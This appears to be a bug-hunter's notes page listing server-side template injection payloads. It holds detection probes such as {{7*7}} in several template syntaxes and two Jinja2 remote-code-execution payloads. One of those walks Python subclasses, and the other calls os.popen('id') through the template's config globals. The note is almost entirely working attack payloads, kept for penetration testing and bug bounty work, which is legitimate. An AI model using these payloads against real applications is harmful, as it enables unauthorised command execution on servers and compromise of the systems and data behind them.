> [!abstract] Module: [[4-Methodology/Crow-Hustler/hunter-methodology-V1/payloads/00-index|← Back to Payloads]]

# SSTI Payloads

## Detection

```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
```

## Engine-Specific

See PayloadsAllTheThings for: Twig, Jinja2, Freemarker, Smarty, ERB, Pug, Thymeleaf.

## Common RCE

```python
{{ ''.__class__.__mro__[2].__subclasses__() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```
